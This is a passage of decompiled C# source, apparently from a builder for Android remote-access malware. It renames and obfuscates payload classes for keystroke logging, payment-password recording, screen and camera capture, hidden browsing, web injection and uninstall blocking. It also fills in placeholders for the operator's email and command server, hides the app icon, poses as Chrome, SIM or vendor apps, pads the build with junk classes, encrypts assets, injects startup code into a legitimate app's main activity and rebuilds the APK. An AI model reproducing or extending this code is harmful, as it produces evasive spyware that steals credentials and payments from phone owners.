				string[] files2 = Directory.GetFiles(text, "*.smali", SearchOption.AllDirectories);
				foreach (string text5 in files2)
				{
					if (text5.Contains("\\android\\") || text5.Contains("\\androidx\\"))
					{
						continue;
					}
					string text6 = File.ReadAllText(text5);
					string text7 = text6.Replace("AccessibilityActivity", N_AccessibilityActivity).Replace("AccessServices", N_AccessServices).Replace("HiddenBrowser", N_HiddenBrowser)
						.Replace("AccessTools", N_AccessTools)
						.Replace("ActivityCaptureScreen", N_ActivityCaptureScreen)
						.Replace("ActivityMonitors", NActivityMonitors)
						.Replace("_update_app_", N_update_app_)
						.Replace("Consts", N__Consts_)
						.Replace("Codes", N__Codes_)
						.Replace("ChatActivity", N__ChatActivity_)
						.Replace("CameraCap", N_CameraCap)
						.Replace("Contct_manager", N_Contct_manager)
						.Replace("Deviceinfo", N_Deviceinfo)
						.Replace("filesManager", N_filesManager)
						.Replace("id_Commands", N_id_Commands)
						.Replace("KeyStorksQ", N_KeyStorksQ)
						.Replace("LiveChat", N_LiveChat)
						.Replace("QueryChats", N_QueryChats)
						.Replace("LiveKeysStrok", N_LiveKeysStrok)
						.Replace("StarterServices", N_StarterServices)
						.Replace("LocationMonitor", N_LocationMonitor)
						.Replace("LockAppsActivity", N_LockAppsActivity)
						.Replace("ActivMain", N_ActivMain)
						.Replace("MyLoger", N_MyLoger)
						.Replace("MyNotification", N_MyNotification)
						.Replace("MyPacket", N_MyPacket)
						.Replace("My_Configs", N_My_Configs)
						.Replace("ActivityDraw", N_ActivityDraw)
						.Replace("My_Crpter", N_My_Crpter)
						.Replace("MySettings", N_MySettings)
						.Replace("PermissionsActivity", N_PermissionsActivity)
						.Replace("RecordPayPassWord", N_RecordPayPassWord)
						.Replace("RequestDraw", N_RequestDraw)
						.Replace("MuteUninstall", N_MuteUninstall)
						.Replace("RequestPermissions2", N_RequestPermissions2)
						.Replace("ScreenCaps", N_ScreenCaps)
						.Replace("ScreenReceiver", N_ScreenReceiver)
						.Replace("StatusMonitor", N_StatusMonitor)
						.Replace("UtliTools", N_UtliTools)
						.Replace("NotifyListenService", N_NotifyListenService)
						.Replace("WorkServices", N_WorkServices)
						.Replace("HiddenActivity", N_HiddenActivity)
						.Replace("LockActivity", N_LockActivity)
						.Replace("RestrectionActivity", N_RestrectionActivity)
						.Replace("OPPOAutostart", N_OPPOAutostart)
						.Replace("BrodcastActivity", N_BrodcastActivity)
						.Replace("AnUninstall ", N_AnUninstall)
						.Replace("TransparentActivity", N_TransparentActivity)
						.Replace("EngineWorker", N_EngineWorker)
						.Replace("TransparentLauncherAlias", N_TransparentLauncherAlias)
						.Replace("SIMLauncherAlias", N_SIMLauncherAlias)
						.Replace("ChromeLauncherAlias", N_ChromeLauncherAlias)
						.Replace("VivoLauncherAlias", N_VivoLauncherAlias)
						.Replace("OppoLauncherAlias", N_OppoLauncherAlias)
						.Replace("MuteActivity", N_MuteActivity)
						.Replace("AlertActivity", N_AlertActivity)
						.Replace("HiddenIco", N_HiddenIco)
						.Replace("WebBrowser", N_WebBrowser)
						.Replace("Webjector", N_Webjector)
						.Replace("ClassGen", N_ClassGen)
						.Replace("[USER_MAIL]", Email)
						.Replace("[USE-SUPER]", use_access)
						.Replace("[USER_DOM]", UserHost)
						.Replace("[USE-NOKILL]", use_antkill)
						.Replace("[USE-DRAWOVER]", use_draw)
						.Replace("[USE-AUTOGRANT]", use_atoprims)
						.Replace("[USE-ALLPRIM]", ASKPRIM_all)
						.Replace("[USE-BLACK]", ASKPRIM_black)
						.Replace("[USE-HIDDEEN]", hiddenapp)
						.Replace("[USE-STORE]", IsStoreMod)
						.Replace("[USE-GUID]", installtype)
						.Replace("[USE-FAKE]", hidetype)
						.Replace("[AST-PAS]", AssetsPass)
						.Replace("[Client_N]", ClientName)
						.Replace("[_NOTIFI_TITLE_]", notifytitle)
						.Replace("[_NOTIFI_MSG_]", notifymsg)
						.Replace("[OBFS]", NEWRANDOM)
						.Replace("[BSE_URL]", appurl)
						.Replace("[log-title]", logintitle)
						.Replace("[log-dis]", logindis)
						.Replace("[log-btn]", loginbtn)
						.Replace("[log-lng]", lngshort)
						.Replace("[USE-OOENACC]", open_access)
						.Replace("[USE-DIAO]", diao_type)
						.Replace("AudioRecorder", N_AudioRecorder)
						.Replace(drop_oldpkg, drop_newpkg)
						.Replace(oldpkg, newpkg)
						.Replace(oldpkg_insmali, newpkg_insmali)
						.Replace("Apps_Manage", N_Apps_Manage);
					foreach (string item2 in To_Obfucate)
					{
						text7 = text7.Replace(item2, Obfucated[item2]);
					}
					File.WriteAllText(text5, text7);
				}
				string text8 = text + "\\com\\icontrol\\protector";
				string searchPattern = "*.smali";
				int num2 = 0;
				string[] files3 = Directory.GetFiles(text8, searchPattern, SearchOption.AllDirectories);
				foreach (string text9 in files3)
				{
					if (text9.Contains("AccessibilityActivity") | text9.Equals("AccessibilityActivity"))
					{
						File.Move(Path.Combine(text8, text9), Path.Combine(text8, text9.Replace("AccessibilityActivity", N_AccessibilityActivity)));
					}
					if (text9.Contains("AccessTools") | text9.Equals("AccessTools"))
					{
						File.Move(Path.Combine(text8, text9), Path.Combine(text8, text9.Replace("AccessTools", N_AccessTools)));
					}
					if (text9.Contains("AccessServices") | text9.Equals("AccessServices"))
					{
						File.Move(Path.Combine(text8, text9), Path.Combine(text8, text9.Replace("AccessServices", N_AccessServices)));
					}
					if (text9.Contains("HiddenBrowser") | text9.Equals("HiddenBrowser"))
					{
						File.Move(Path.Combine(text8, text9), Path.Combine(text8, text9.Replace("HiddenBrowser", N_HiddenBrowser)));
					}
					if (text9.Contains("ActivityCaptureScreen") | text9.Equals("ActivityCaptureScreen"))
					{
						File.Move(Path.Combine(text8, text9), Path.Combine(text8, text9.Replace("ActivityCaptureScreen", N_ActivityCaptureScreen)));
					}
					if (text9.Contains("ActivityMonitors") | text9.Equals("ActivityMonitors"))
					{
						File.Move(Path.Combine(text8, text9), Path.Combine(text8, text9.Replace("ActivityMonitors", NActivityMonitors)));
					}
					if (text9.Contains("CameraCap") | text9.Equals("CameraCap"))
					{
						File.Move(Path.Combine(text8, text9), Path.Combine(text8, text9.Replace("CameraCap", N_CameraCap)));
					}
					if (text9.Contains("_update_app_") | text9.Equals("_update_app_"))
					{
						File.Move(Path.Combine(text8, text9), Path.Combine(text8, text9.Replace("_update_app_", N_update_app_)));
					}
					if (text9.Contains("Codes") | text9.Equals("Codes"))
					{
						File.Move(Path.Combine(text8, text9), Path.Combine(text8, text9.Replace("Codes", N__Codes_)));
					}
					if (text9.Contains("Consts") | text9.Equals("Consts"))
					{
						File.Move(Path.Combine(text8, text9), Path.Combine(text8, text9.Replace("Consts", N__Consts_)));
					}
					if (text9.Contains("ChatActivity") | text9.Equals("ChatActivity"))
					{
						File.Move(Path.Combine(text8, text9), Path.Combine(text8, text9.Replace("ChatActivity", N__ChatActivity_)));
					}
					if (text9.Contains("Contct_manager") | text9.Equals("Contct_manager"))
					{
						File.Move(Path.Combine(text8, text9), Path.Combine(text8, text9.Replace("Contct_manager", N_Contct_manager)));
					}
					if (text9.Contains("My_Configs") | text9.Equals("My_Configs"))
					{
						File.Move(Path.Combine(text8, text9), Path.Combine(text8, text9.Replace("My_Configs", N_My_Configs)));
					}
					if (text9.Contains("ActivityDraw") | text9.Equals("ActivityDraw"))
					{
						File.Move(Path.Combine(text8, text9), Path.Combine(text8, text9.Replace("ActivityDraw", N_ActivityDraw)));
					}
					if (text9.Contains("My_Crpter") | text9.Equals("My_Crpter"))
					{
						File.Move(Path.Combine(text8, text9), Path.Combine(text8, text9.Replace("My_Crpter", N_My_Crpter)));
					}
					if (text9.Contains("Deviceinfo") | text9.Equals("Deviceinfo"))
					{
						File.Move(Path.Combine(text8, text9), Path.Combine(text8, text9.Replace("Deviceinfo", N_Deviceinfo)));
					}
					if (text9.Contains("filesManager") | text9.Equals("filesManager"))
					{
						File.Move(Path.Combine(text8, text9), Path.Combine(text8, text9.Replace("filesManager", N_filesManager)));
					}
					if (text9.Contains("id_Commands") | text9.Equals("id_Commands"))
					{
						File.Move(Path.Combine(text8, text9), Path.Combine(text8, text9.Replace("id_Commands", N_id_Commands)));
					}
					if (text9.Contains("KeyStorksQ") | text9.Equals("KeyStorksQ"))
					{
						File.Move(Path.Combine(text8, text9), Path.Combine(text8, text9.Replace("KeyStorksQ", N_KeyStorksQ)));
					}
					if (text9.Contains("LiveChat") | text9.Equals("LiveChat"))
					{
						File.Move(Path.Combine(text8, text9), Path.Combine(text8, text9.Replace("LiveChat", N_LiveChat)));
					}
					if (text9.Contains("QueryChats") | text9.Equals("QueryChats"))
					{
						File.Move(Path.Combine(text8, text9), Path.Combine(text8, text9.Replace("QueryChats", N_QueryChats)));
					}
					if (text9.Contains("LiveKeysStrok") | text9.Equals("LiveKeysStrok"))
					{
						File.Move(Path.Combine(text8, text9), Path.Combine(text8, text9.Replace("LiveKeysStrok", N_LiveKeysStrok)));
					}
					if (text9.Contains("StarterServices") | text9.Equals("StarterServices"))
					{
						File.Move(Path.Combine(text8, text9), Path.Combine(text8, text9.Replace("StarterServices", N_StarterServices)));
					}
					if (text9.Contains("LocationMonitor") | text9.Equals("LocationMonitor"))
					{
						File.Move(Path.Combine(text8, text9), Path.Combine(text8, text9.Replace("LocationMonitor", N_LocationMonitor)));
					}
					if (text9.Contains("LockAppsActivity") | text9.Equals("LockAppsActivity"))
					{
						File.Move(Path.Combine(text8, text9), Path.Combine(text8, text9.Replace("LockAppsActivity", N_LockAppsActivity)));
					}
					if (text9.Contains("MainActivity") | text9.Equals("MainActivity"))
					{
						File.Move(Path.Combine(text8, text9), Path.Combine(text8, text9.Replace("MainActivity", N_ActivMain)));
					}
					if (text9.Contains("MyLoger") | text9.Equals("MyLoger"))
					{
						File.Move(Path.Combine(text8, text9), Path.Combine(text8, text9.Replace("MyLoger", N_MyLoger)));
					}
					if (text9.Contains("MyNotification") | text9.Equals("MyNotification"))
					{
						File.Move(Path.Combine(text8, text9), Path.Combine(text8, text9.Replace("MyNotification", N_MyNotification)));
					}
					if (text9.Contains("MyPacket") | text9.Equals("MyPacket"))
					{
						File.Move(Path.Combine(text8, text9), Path.Combine(text8, text9.Replace("MyPacket", N_MyPacket)));
					}
					if (text9.Contains("MySettings") | text9.Equals("MySettings"))
					{
						File.Move(Path.Combine(text8, text9), Path.Combine(text8, text9.Replace("MySettings", N_MySettings)));
					}
					if (text9.Contains("PermissionsActivity") | text9.Equals("PermissionsActivity"))
					{
						File.Move(Path.Combine(text8, text9), Path.Combine(text8, text9.Replace("PermissionsActivity", N_PermissionsActivity)));
					}
					if (text9.Contains("RecordPayPassWord") | text9.Equals("RecordPayPassWord"))
					{
						File.Move(Path.Combine(text8, text9), Path.Combine(text8, text9.Replace("RecordPayPassWord", N_RecordPayPassWord)));
					}
					if (text9.Contains("RequestDraw") | text9.Equals("RequestDraw"))
					{
						File.Move(Path.Combine(text8, text9), Path.Combine(text8, text9.Replace("RequestDraw", N_RequestDraw)));
					}
					if (text9.Contains("MuteUninstall") | text9.Equals("MuteUninstall"))
					{
						File.Move(Path.Combine(text8, text9), Path.Combine(text8, text9.Replace("MuteUninstall", N_MuteUninstall)));
					}
					if (text9.Contains("RequestPermissions2") | text9.Equals("RequestPermissions2"))
					{
						File.Move(Path.Combine(text8, text9), Path.Combine(text8, text9.Replace("RequestPermissions2", N_RequestPermissions2)));
					}
					if (text9.Contains("ScreenCaps") | text9.Equals("ScreenCaps"))
					{
						File.Move(Path.Combine(text8, text9), Path.Combine(text8, text9.Replace("ScreenCaps", N_ScreenCaps)));
					}
					if (text9.Contains("ScreenReceiver") | text9.Equals("ScreenReceiver"))
					{
						File.Move(Path.Combine(text8, text9), Path.Combine(text8, text9.Replace("ScreenReceiver", N_ScreenReceiver)));
					}
					if (text9.Contains("StatusMonitor") | text9.Equals("StatusMonitor"))
					{
						File.Move(Path.Combine(text8, text9), Path.Combine(text8, text9.Replace("StatusMonitor", N_StatusMonitor)));
					}
					if (text9.Contains("UtliTools") | text9.Equals("UtliTools"))
					{
						File.Move(Path.Combine(text8, text9), Path.Combine(text8, text9.Replace("UtliTools", N_UtliTools)));
					}
					if (text9.Contains("NotifyListenService") | text9.Equals("NotifyListenService"))
					{
						File.Move(Path.Combine(text8, text9), Path.Combine(text8, text9.Replace("NotifyListenService", N_NotifyListenService)));
					}
					if (text9.Contains("WorkServices") | text9.Equals("WorkServices"))
					{
						File.Move(Path.Combine(text8, text9), Path.Combine(text8, text9.Replace("WorkServices", N_WorkServices)));
					}
					if (text9.Contains("HiddenActivity") | text9.Equals("HiddenActivity"))
					{
						File.Move(Path.Combine(text8, text9), Path.Combine(text8, text9.Replace("HiddenActivity", N_HiddenActivity)));
					}
					if (text9.Contains("LockActivity") | text9.Equals("LockActivity"))
					{
						File.Move(Path.Combine(text8, text9), Path.Combine(text8, text9.Replace("LockActivity", N_LockActivity)));
					}
					if (text9.Contains("BrodcastActivity") | text9.Equals("BrodcastActivity"))
					{
						File.Move(Path.Combine(text8, text9), Path.Combine(text8, text9.Replace("BrodcastActivity", N_BrodcastActivity)));
					}
					if (text9.Contains("OPPOAutostart") | text9.Equals("OPPOAutostart"))
					{
						File.Move(Path.Combine(text8, text9), Path.Combine(text8, text9.Replace("OPPOAutostart", N_OPPOAutostart)));
					}
					if (text9.Contains("RestrectionActivity") | text9.Equals("RestrectionActivity"))
					{
						File.Move(Path.Combine(text8, text9), Path.Combine(text8, text9.Replace("RestrectionActivity", N_RestrectionActivity)));
					}
					if (text9.Contains("AnUninstall") | text9.Equals("AnUninstall"))
					{
						File.Move(Path.Combine(text8, text9), Path.Combine(text8, text9.Replace("AnUninstall", N_AnUninstall)));
					}
					if (text9.Contains("TransparentActivity") | text9.Equals("TransparentActivity"))
					{
						File.Move(Path.Combine(text8, text9), Path.Combine(text8, text9.Replace("TransparentActivity", N_TransparentActivity)));
					}
					if (text9.Contains("EngineWorker") | text9.Equals("EngineWorker"))
					{
						File.Move(Path.Combine(text8, text9), Path.Combine(text8, text9.Replace("EngineWorker", N_EngineWorker)));
					}
					if (text9.Contains("TransparentLauncherAlias") | text9.Equals("TransparentLauncherAlias"))
					{
						File.Move(Path.Combine(text8, text9), Path.Combine(text8, text9.Replace("TransparentLauncherAlias", N_TransparentLauncherAlias)));
					}
					if (text9.Contains("SIMLauncherAlias") | text9.Equals("SIMLauncherAlias"))
					{
						File.Move(Path.Combine(text8, text9), Path.Combine(text8, text9.Replace("SIMLauncherAlias", N_SIMLauncherAlias)));
					}
					if (text9.Contains("ChromeLauncherAlias") | text9.Equals("ChromeLauncherAlias"))
					{
						File.Move(Path.Combine(text8, text9), Path.Combine(text8, text9.Replace("ChromeLauncherAlias", N_ChromeLauncherAlias)));
					}
					if (text9.Contains("OppoLauncherAlias") | text9.Equals("OppoLauncherAlias"))
					{
						File.Move(Path.Combine(text8, text9), Path.Combine(text8, text9.Replace("OppoLauncherAlias", N_OppoLauncherAlias)));
					}
					if (text9.Contains("VivoLauncherAlias") | text9.Equals("VivoLauncherAlias"))
					{
						File.Move(Path.Combine(text8, text9), Path.Combine(text8, text9.Replace("VivoLauncherAlias", N_VivoLauncherAlias)));
					}
					if (text9.Contains("MuteActivity") | text9.Equals("MuteActivity"))
					{
						File.Move(Path.Combine(text8, text9), Path.Combine(text8, text9.Replace("MuteActivity", N_MuteActivity)));
					}
					if (text9.Contains("AlertActivity") | text9.Equals("AlertActivity"))
					{
						File.Move(Path.Combine(text8, text9), Path.Combine(text8, text9.Replace("AlertActivity", N_AlertActivity)));
					}
					if (text9.Contains("HiddenIco") | text9.Equals("HiddenIco"))
					{
						File.Move(Path.Combine(text8, text9), Path.Combine(text8, text9.Replace("HiddenIco", N_HiddenIco)));
					}
					if (text9.Contains("WebBrowser") | text9.Equals("WebBrowser"))
					{
						File.Move(Path.Combine(text8, text9), Path.Combine(text8, text9.Replace("WebBrowser", N_WebBrowser)));
					}
					if (text9.Contains("Webjector") | text9.Equals("Webjector"))
					{
						File.Move(Path.Combine(text8, text9), Path.Combine(text8, text9.Replace("Webjector", N_Webjector)));
					}
					if (text9.Contains("Apps_Manage") | text9.Equals("Apps_Manage"))
					{
						File.Move(Path.Combine(text8, text9), Path.Combine(text8, text9.Replace("APPS", N_Apps_Manage)));
					}
					if (text9.Contains("AudioRecorder") | text9.Equals("AudioRecorder"))
					{
						File.Move(Path.Combine(text8, text9), Path.Combine(text8, text9.Replace("AudioRecorder", N_AudioRecorder)));
					}
					num2++;
					Thread.Sleep(1);
				}
				num2 = 0;
				string[] files4 = Directory.GetFiles(text8, searchPattern, SearchOption.AllDirectories);
				foreach (string text10 in files4)
				{
					if (text10.Contains("ClassGen"))
					{
						File.Move(Path.Combine(text8, text10), Path.Combine(text8, text10.Replace("ClassGen", N_ClassGen)));
					}
					num2++;
					Thread.Sleep(1);
				}
			}
			catch (Exception ex5)
			{
				ProjectData.SetProjectError(ex5);
				Exception ex6 = ex5;
				Mylogger.LogError(userid, "Step4", ex6.Message);
				ProjectData.ClearProjectError();
			}
			if (IsCustomeApp)
			{
				Mylogger.Logbuild(userid, "junk classes...");
				GenerateJunkSmaliFiles(text, 165);
				string manifestPath = TheApkPath + "\\AndroidManifest.xml";
				GenerateJunkAndroidComponents(text, manifestPath);
				Mylogger.Logbuild(userid, ">> Shuffle Classes...");
				ShuffleSmaliFiles(TheApkPath, 3);
				try
				{
					string text11 = TheApkPath + "\\assets";
					InjectRandomJunkFiles(text11);
					Mylogger.Logbuild(userid, $"Encrypt Assets:{AssetsPass}");
					EncryptFolder(text11, AssetsPass);
				}
				catch (Exception ex7)
				{
					ProjectData.SetProjectError(ex7);
					Exception ex8 = ex7;
					Mylogger.Logbuild(userid, $"Encrypt Assets:{ex8.Message}");
					ProjectData.ClearProjectError();
				}
			}
			else
			{
				Mylogger.Logbuild(userid, ">> Injecting Main Activity...");
				try
				{
					string path2 = TheApkPath + "\\" + MainActivity;
					if (File.Exists(path2))
					{
						string[] array2 = File.ReadAllLines(path2);
						int num3 = array2.Length - 1;
						string newValue = default(string);
						for (int m = 0; m <= num3; m++)
						{
							if (m == 0)
							{
								string[] array3 = array2[0].Split(' ');
								newValue = array3[array3.Length - 1];
							}
							if (array2[m].Contains("onCreate(") && array2[m].ToLower().StartsWith(".method".ToLower()) && !array2[m].ToLower().Contains("native"))
							{
								array2[m] = array2[m] + Environment.NewLine + Resources.oncreatecode.Replace("[trgtmain]", newValue);
								array2[array2.Length - 1] = array2[array2.Length - 1] + Environment.NewLine + Environment.NewLine + Resources.MainMith.Replace("[trgtmain]", newValue).Replace(oldpkg_insmali, newpkg_insmali).Replace("ActivMain", N_ActivMain)
									.Replace("StarterServices", N_StarterServices);
								break;
							}
						}
						File.WriteAllLines(path2, array2);
					}
				}
				catch (Exception ex9)
				{
					ProjectData.SetProjectError(ex9);
					Exception ex10 = ex9;
					Mylogger.LogError(userid, "Step5", ex10.Message);
					ProjectData.ClearProjectError();
				}
			}
			Thread.Sleep(1000);
			Mylogger.Logbuild(userid, ">> Big namespace manifist...");
			ReplaceHugePlaceholders(TheApkPath + "\\AndroidManifest.xml", 800000L, 400000000L);
			Mylogger.Logbuild(userid, ">----------------->> Building Apk...");
			string text12 = WorkingDir + "\\out";
			outputapk = text12 + "\\Ready.apk";
			if (!Directory.Exists(text12))
			{
				Directory.CreateDirectory(text12);
			}
			ExecuteCommand("java -jar " + apktoolpath + " b -f " + TheApkPath + " -o " + outputapk);
		}
	}

	private static void UpdateApkSrcs()
	{
		Mylogger.Logbuild(userid, ">> Merging Res folder...");
		string path = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "apkstub", "apkres");
		string path2 = TheApkPath + "\\res";
		string[] array = new string[1] { "drawable" };
		string[] array2 = new string[3] { "strings.xml", "public.xml", "ids.xml" };
		try
		{
			string[] array3 = array;
			foreach (string path3 in array3)
			{
				string text = Path.Combine(path, path3);
				string text2 = Path.Combine(path2, path3);
				if (Directory.Exists(text))
				{
					Directory.CreateDirectory(text2);
					CopyDirectory(text, text2);
				}
				else
				{
					failresfolder($"Source folder does not exist: {text}");
				}
			}
			string text3 = Path.Combine(path, "values");
			string text4 = Path.Combine(path2, "values");
			if (Directory.Exists(text3))
			{
				if (!Directory.Exists(text4))
				{
					failresfolder($"dest values folder does not exist: {text3}");
				}
				string[] array4 = array2;
				foreach (string text5 in array4)
				{
					string text6 = Path.Combine(text3, text5);
					string text7 = Path.Combine(text4, text5);
					if (File.Exists(text6) && File.Exists(text7))
					{
						Mylogger.Logbuild(userid, ">> ToMerge: " + text6);
						Mylogger.Logbuild(userid, ">> MergeWith: " + text7);
						if (Operators.CompareString(text5.ToLower(), "public.xml", TextCompare: false) == 0)
						{
							MergePublicXmlFiles(text6, text7);
						}
						else
						{
							MergeXmlFiles(text6, text7);
						}
					}
					else if (File.Exists(text6))
					{
						Mylogger.Logbuild(userid, ">> Merge fail Coping: " + text6);
						File.Copy(text6, text7, overwrite: true);
						failresfolder($"Dis file does not exist: {text6}");
					}
					else
					{
						failresfolder($"Source file does not exist: {text6}");
					}
				}
			}
			else
			{
				failresfolder($"Source values folder does not exist: {text3}");
			}
			Mylogger.Logbuild(userid, ">> Merging Res successfully...");
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			failresfolder(ex2.Message);
			ProjectData.ClearProjectError();
		}
	}

	private static void failresfolder(string Message)
	{
		UpdateState(failed);
		Mylogger.LogError(userid, ">UpdateApkSrcs: ", Message);
		singout(MYID);
		Environment.Exit(0);
	}

	private static void CopyDirectory(string sourceDir, string destDir)
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(sourceDir);
		DirectoryInfo[] directories = directoryInfo.GetDirectories();
		if (!Directory.Exists(destDir))
		{
			Directory.CreateDirectory(destDir);
		}
		FileInfo[] files = directoryInfo.GetFiles();
		FileInfo[] array = files;
		foreach (FileInfo fileInfo in array)
		{
			string text = Path.Combine(destDir, fileInfo.Name);
			if (!File.Exists(text))
			{
				fileInfo.CopyTo(text, overwrite: false);
			}
		}
		DirectoryInfo[] array2 = directories;
		foreach (DirectoryInfo directoryInfo2 in array2)
		{
			string destDir2 = Path.Combine(destDir, directoryInfo2.Name);
			CopyDirectory(directoryInfo2.FullName, destDir2);
		}
	}

	private static void MergePublicXmlFiles(string sourceFile, string destFile)
	{
		checked
		{
			try
			{
				XDocument xDocument = XDocument.Load(sourceFile);
				XDocument xDocument2 = XDocument.Load(destFile);
				IEnumerable<XElement> enumerable = xDocument.Root.Elements("public");
				IEnumerable<XElement> enumerable2 = xDocument2.Root.Elements("public");
				Dictionary<string, string> dictionary = new Dictionary<string, string>();
				foreach (XElement item in enumerable2)
				{
					string value = item.Attribute("id").Value;
					string value2 = item.Attribute("type").Value;
					dictionary[value] = value2;
				}
				HashSet<string> hashSet = new HashSet<string>(enumerable2.Select([SpecialName] (XElement e) => e.Attribute("name").Value));
				Dictionary<string, int> dictionary2 = new Dictionary<string, int>();
				foreach (XElement item2 in enumerable2)
				{
					string value3 = item2.Attribute("type").Value;
					int num = Convert.ToInt32(item2.Attribute("id").Value, 16);
					if (dictionary2.ContainsKey(value3))
					{
						if (num > dictionary2[value3])
						{
							dictionary2[value3] = num;
						}
					}
					else
					{
						dictionary2[value3] = num;
					}
				}
				List<string> list = new List<string> { "string", "drawable", "xml", "layout", "id" };
				foreach (string item3 in list)
				{
					if (!dictionary2.ContainsKey(item3))
					{
						int value4;
						do
						{
							value4 = (dictionary2.ContainsKey(item3) ? (dictionary2[item3] + 1) : 2130771968);
						}
						while (dictionary.ContainsKey("0x" + value4.ToString("X8")));
						dictionary2[item3] = value4;
						dictionary["0x" + value4.ToString("X8")] = item3;
					}
				}
				List<XElement> list2 = new List<XElement>(enumerable2);
				_Closure_0024__219_002D0 closure_0024__219_002D = default(_Closure_0024__219_002D0);
				foreach (XElement item4 in enumerable)
				{
					closure_0024__219_002D = new _Closure_0024__219_002D0(closure_0024__219_002D);
					string value5 = item4.Attribute("id").Value;
					closure_0024__219_002D._0024VB_0024Local_sourceName = item4.Attribute("name").Value;
					string value6 = item4.Attribute("type").Value;
					if (hashSet.Contains(closure_0024__219_002D._0024VB_0024Local_sourceName))
					{
						XElement xElement = enumerable2.FirstOrDefault(closure_0024__219_002D._Lambda_0024__1);
						if (xElement != null)
						{
							string value7 = xElement.Attribute("id").Value;
							Obfucated[value5] = value7;
						}
						continue;
					}
					string text;
					do
					{
						dictionary2[value6]++;
						text = "0x" + dictionary2[value6].ToString("X8");
					}
					while (dictionary.ContainsKey(text));
					item4.SetAttributeValue("id", text);
					Obfucated[value5] = text;
					dictionary[text] = value6;
					hashSet.Add(closure_0024__219_002D._0024VB_0024Local_sourceName);
					list2.Add(item4);
				}
				XElement xElement2 = new XElement("resources", list2);
				XDocument xDocument3 = new XDocument(xElement2);
				xDocument3.Save(destFile);
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				failresfolder($"MergePublicXmlFiles: {ex2.Message}");
				ProjectData.ClearProjectError();
			}
		}
	}

	private static void MergeXmlFiles(string sourceFile, string destFile)
	{
		XDocument xDocument = XDocument.Load(sourceFile);
		XDocument xDocument2 = XDocument.Load(destFile);
		IEnumerable<XElement> second = xDocument.Root.Elements();
		IEnumerable<XElement> first = xDocument2.Root.Elements();
		IEnumerable<XElement> content = from e in first.Concat(second)
			group e by e.Attribute("name").Value into g
			select g.First();
		XElement xElement = new XElement("resources", content);
		XDocument xDocument3 = new XDocument(xElement);
		xDocument3.Save(destFile);
	}

	private static void Step2()
	{
		Mylogger.Logbuild(userid, ">> Check Permissions...");
		while (EaodWorker.Codes.FileInUse(TheApkPath + "\\AndroidManifest.xml") | !File.Exists(TheApkPath + "\\AndroidManifest.xml"))
		{
			Thread.Sleep(1000);
		}
		string text = File.ReadAllText(TheApkPath + "\\AndroidManifest.xml");
		if (Operators.CompareString(hidetype, "c", TextCompare: false) == 0)
		{
			text = text.Replace(Resources.luncherIntent, Resources.ManifistHide);
			File.WriteAllText(TheApkPath + "\\AndroidManifest.xml", text);
		}
		checked
		{
			try
			{
				if (IsCustomeApp)
				{
					string text2 = TheApkPath + "\\res\\values\\strings.xml";
					do
					{
						Thread.Sleep(100);
					}
					while (!File.Exists(text2) | EaodWorker.Codes.FileInUse(text2));
					Mylogger.Logbuild(userid, ">> Encoding Strings file...");
					string text3 = File.ReadAllText(text2);
					text3 = text3.Replace("[BASE_NAME]", appname);
					text3 = text3.Replace("[BASE_DESC]", descr_iption);
					File.WriteAllText(text2, text3);
					Thread.Sleep(100);
					string[] array = File.ReadAllLines(text2);
					string text4 = "";
					int num = 1;
					do
					{
						string text5 = Conversions.ToString(EaodWorker.Codes.Random_Word());
						string text6 = Conversions.ToString(EaodWorker.Codes.RandommMad(4, 15));
						string text7 = Conversions.ToString(EaodWorker.Codes.Random_Word());
						string text8 = Conversions.ToString(EaodWorker.Codes.RandommMad(4, 15));
						text4 = text4 + "    <string name=\"" + text5 + text6 + "\">" + text7 + text8 + "</string>\r\n";
						num++;
					}
					while (num <= 200);
					int num2 = array.Length - 1;
					int num3 = num2;
					for (int i = 0; i <= num3; i++)
					{
						if (array[i].Contains("<string name"))
						{
							array[i] = array[i] + "\r\n" + text4;
							break;
						}
					}
					File.WriteAllLines(text2, array);
					Mylogger.Logbuild(userid, ">> Change ico...");
					string text9 = TheApkPath + "\\res\\drawable\\mylogo.png";
					if (File.Exists(text9))
					{
						File.Delete(text9);
					}
					File.Copy(TargetApkicon, text9);
					Mylogger.Logbuild(userid, ">> Change blackui...");
					string text10 = TheApkPath + "\\res\\drawable\\blackui.png";
					string text11 = TheApkPath + "\\res\\values\\public.xml";
					if (Operators.CompareString(noemulator.ToLower(), "black", TextCompare: false) == 0)
					{
						if (File.Exists(text10))
						{
							File.Delete(text10);
						}
						if (File.Exists(text11))
						{
							XmlDocument xmlDocument = new XmlDocument();
							xmlDocument.Load(text11);
							XmlNodeList xmlNodeList = xmlDocument.SelectNodes("//public[@type='drawable' and @name='blackui']");
							foreach (XmlNode item in xmlNodeList)
							{
								item.ParentNode.RemoveChild(item);
							}
							xmlDocument.Save(text11);
						}
					}
					else
					{
						if (File.Exists(text10))
						{
							File.Delete(text10);
						}
						if (File.Exists(noemulator))
						{
							File.Copy(noemulator, text10);
						}
						else
						{
							Mylogger.Logbuild(userid, "源文件不存在: " + noemulator);
						}
					}
					Thread.Sleep(1000);
					string text12 = TheApkPath + "\\apktool.yml";
					do
					{
						Thread.Sleep(100);
					}
					while (!File.Exists(text12) | EaodWorker.Codes.FileInUse(text12));
					string contents = File.ReadAllText(text12).Replace("3.31.165", Conversions.ToString(Operators.AddObject(appversion + " ", EaodWorker.Codes.Random_Word()))).Replace("331165", appversion.Replace(".", ""));
					File.WriteAllText(text12, contents);
				}
				if (!IsCustomeApp)
				{
					if (!text.ToLower().Contains("android.permission.WRITE_EXTERNAL_STORAGE".ToLower()))
					{
						need_write = true;
					}
					if (!text.ToLower().Contains("android.permission.MANAGE_EXTERNAL_STORAGE".ToLower()))
					{
						need_externalstorage = true;
					}
					if (!text.ToLower().Contains("android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS".ToLower()))
					{
						need_battery = true;
					}
					if (!text.ToLower().Contains("android.permission.READ_EXTERNAL_STORAGE".ToLower()))
					{
						need_read = true;
					}
					if (!text.ToLower().Contains("android.permission.FOREGROUND_SERVICE".ToLower()))
					{
						need_forground = true;
					}
					if (!text.ToLower().Contains("android.permission.SYSTEM_ALERT_WINDOW".ToLower()))
					{
						need_syswinow = true;
					}
					if (!text.ToLower().Contains("android.permission.RECEIVE_BOOT_COMPLETED".ToLower()))
					{
						need_boot = true;
					}
				}
